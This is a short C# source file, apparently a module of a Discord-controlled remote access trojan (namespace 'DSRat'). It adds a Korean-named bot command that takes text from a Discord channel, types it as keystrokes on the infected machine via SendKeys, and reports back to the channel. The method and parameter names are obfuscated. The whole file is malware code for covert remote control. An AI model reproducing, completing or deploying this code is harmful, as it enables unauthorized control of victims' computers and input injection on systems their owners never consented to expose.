using Discord.Commands;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DSRat
{
    public class keysend : ModuleBase<SocketCommandContext>
    {
        [Command("키입력")]
        public async Task keyseasdjkljsaSANDJNSAKJu28347592dklndd(string keNUSINDKJ7789Hankldsnl3479SIJDHhjky)
        {
            SendKeys.SendWait(keNUSINDKJ7789Hankldsnl3479SIJDHhjky);

            await Context.Channel.SendMessageAsync(keNUSINDKJ7789Hankldsnl3479SIJDHhjky + " 입력!");
        }
    }
}